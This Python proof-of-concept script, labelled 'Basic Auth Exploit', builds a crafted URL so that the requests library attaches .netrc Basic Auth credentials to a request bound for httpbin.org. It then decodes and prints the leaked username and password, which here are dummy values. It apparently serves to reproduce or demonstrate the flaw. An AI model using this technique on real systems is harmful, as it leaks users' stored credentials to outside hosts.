from argparse import ArgumentParser
import base64
from optparse import OptionParser
import os
import sys
import requests


def decode_basic_auth(auth_header):
    if not auth_header.startswith("Basic "):
        raise ValueError("Not a Basic Auth header")

    encoded = auth_header[len("Basic ") :]

    decoded_bytes = base64.b64decode(encoded)
    decoded_str = decoded_bytes.decode("utf-8")

    if ":" not in decoded_str:
        raise ValueError("Invalid format, ':' not found")

    username, password = decoded_str.split(":", 1)

    return username, password


def poc(evil_url: str):

    with requests.Session() as session:
        r = requests.Request("GET", evil_url)
        prepared_request = session.prepare_request(r)
        auth_header = prepared_request.headers["Authorization"]
        username, password = decode_basic_auth(auth_header)
        print(f"Username: {username}, Password: {password}")
        if username == "myusername" and password == "mysecretpassword":
            print("Exploit successful! Credentials extracted.")
            exit(1)


def parse_args():
    parser = ArgumentParser(description="Basic Auth Exploit")
    parser.add_argument(
        "-p",
        "--poc",
        action="store_true",
        help="Run proof of concept (PoC) to extract credentials from Basic Auth header",
    )
    args = parser.parse_args()
    return args


os.environ["NETRC"] = ".netrc"


def main():
    args = parse_args()
    if args.poc:
        evil_url = "http://example.com:@httpbin.org/headers"
        poc(evil_url)
        return

    evil_url = "http://example.com:@httpbin.org/headers"
    response = requests.get(evil_url)
    response.raise_for_status()
    print(response.text)


if __name__ == "__main__":
    main()
